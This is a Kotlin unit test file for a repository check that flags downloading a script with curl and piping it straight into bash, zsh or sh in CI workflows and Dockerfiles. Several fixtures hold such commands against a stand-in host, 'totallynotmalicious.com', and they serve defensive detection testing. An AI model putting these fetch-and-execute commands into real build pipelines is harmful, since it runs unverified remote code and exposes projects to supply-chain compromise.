package no.nav.checks.files

import kotlin.test.assertTrue
import no.nav.checks.CheckResult
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Test

class CurlPipeShellCheckTest {

    @Test
    fun `This check should only care about files where the curl pipe pattern is typically used`() {
        val allAvailableFiles = setOf(".github/workflows/yolo.yaml", "README.md", "Dockerfile", "package.json")
        val check = CurlPipeShellCheck()
        val expected = listOf(".github/workflows/yolo.yaml", "Dockerfile", "package.json")
        val actual = check.filesICareAbout(allAvailableFiles)
        assertEquals(expected, actual)
    }

    @Test
    fun `curl pipe to bash is bad`() {
        val filesToCheck = mapOf(
            ".github/workflows/yolo.yaml" to """
                   steps:
                     - uses: actions/checkout@v7.0.0
                       with:
                         persist-credentials: false
                     - run: curl totallynotmalicious.com/legitscript | bash
            """.trimIndent()
        )
        val check = CurlPipeShellCheck()
        val results = check.run("bogusrepo", filesToCheck)
        assertTrue(results is CheckResult.NeedsWork)
        assertEquals(1, results.reasons.size)
    }

    @Test
    fun `curl pipe to zsh is bad`() {
        val filesToCheck = mapOf(
            ".github/workflows/yolo.yaml" to """
                   steps:
                     - uses: actions/checkout@v7.0.0
                       with:
                         persist-credentials: false
                     - run: curl totallynotmalicious.com/legitscript | zsh
            """.trimIndent()
        )
        val check = CurlPipeShellCheck()
        val results = check.run("bogusrepo", filesToCheck)
        assertTrue(results is CheckResult.NeedsWork)
        assertEquals(1, results.reasons.size)
    }

    @Test
    fun `curl pipe to sh is bad`() {
        val filesToCheck = mapOf(
            ".github/workflows/yolo.yaml" to """
                   steps:
                     - uses: actions/checkout@v7.0.0
                       with:
                         persist-credentials: false
                     - run: curl totallynotmalicious.com/legitscript | sh
            """.trimIndent()
        )
        val check = CurlPipeShellCheck()
        val results = check.run("bogusrepo", filesToCheck)
        assertTrue(results is CheckResult.NeedsWork)
        assertEquals(1, results.reasons.size)
        println(results)
    }

    @Test
    fun `detect also if multiple spaces and or tabs are used`() {
        val filesToCheck = mapOf(
            ".github/workflows/yolo.yaml" to """
                   steps:
                     - uses: actions/checkout@v7.0.0
                       with:
                         persist-credentials: false
                     - run: curl totallynotmalicious.com/legitscript   |     bash
            """.trimIndent()
        )
        val check = CurlPipeShellCheck()
        val results = check.run("bogusrepo", filesToCheck)
        assertTrue(results is CheckResult.NeedsWork)
        assertEquals(1, results.reasons.size)
    }

    @Test
    fun `no piping are good`() {
        val filesToCheck = mapOf(
            ".github/workflows/yolo.yaml" to """
                   steps:
                     - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
            """.trimIndent()
        )
        val check = CurlPipeShellCheck()
        val results = check.run("bogusrepo", filesToCheck)
        assertTrue(results is CheckResult.AllGood)
    }

}